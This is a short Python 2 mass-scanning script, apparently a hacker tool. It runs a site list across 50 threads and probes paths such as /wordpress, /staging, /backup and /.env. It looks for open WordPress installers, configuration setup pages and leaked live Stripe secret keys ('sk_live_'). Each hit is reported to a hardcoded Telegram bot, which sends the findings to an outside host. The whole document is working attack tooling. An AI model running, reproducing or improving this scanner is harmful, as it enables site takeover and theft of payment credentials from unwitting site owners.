import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
#M4dki773r
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = '''{}
		   
[*] Create By : M4dki773r
			   
\n'''.format(fr)
print banner
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

Pathlist = ["/wordpress", "/staging","/dev","/bak","/old","/bkp","/old-website", "/dev2","/blog","/backup","/.env"]

class EvaiLCode:
    def __init__(self):

        self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}
    def SendMsg(self, msg):
        token = "7125987187:AAHDbkbgyJikflfzAHtWN_OTrNgXBn2WjNI"
        chatid = "722047141"
        requests.get('https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chatid+'&text='+msg)
        return
	
    def URLdomain(self, site):

        if site.startswith("http://") :
            site = site.replace("http://","")
        elif site.startswith("https://") :
            site = site.replace("https://","")
        else :
            pass
        pattern = re.compile('(.*)/')
        while re.findall(pattern,site):
            sitez = re.findall(pattern,site)
            site = sitez[0]
        return site
		
		
    def checker(self, site):
        try:
			
            url = "http://" + self.URLdomain(site)
            for Path in Pathlist:
                check = requests.get(url + Path, headers=self.headers, verify=False, timeout=5).content
                if("&rsaquo; Installation" in check or "Setup Configuration File" in check or "sk_live_" in check):
                    print('Target:{} > {}[Succefully]').format(url, fg)
                    open('wprez.txt','a').write(url + Path + "\n")
                    self.SendMsg(url + Path + "\n")
                    break
                else:
                    print('Target:{} >! {}[Failid]').format(url, fr)
					
        except:
            pass



	
Control = EvaiLCode()	
def RunUploader(site):
    try:
        Control.checker(site)
    except:
        pass
mp = Pool(50)
mp.map(RunUploader, target)
mp.close()
mp.join()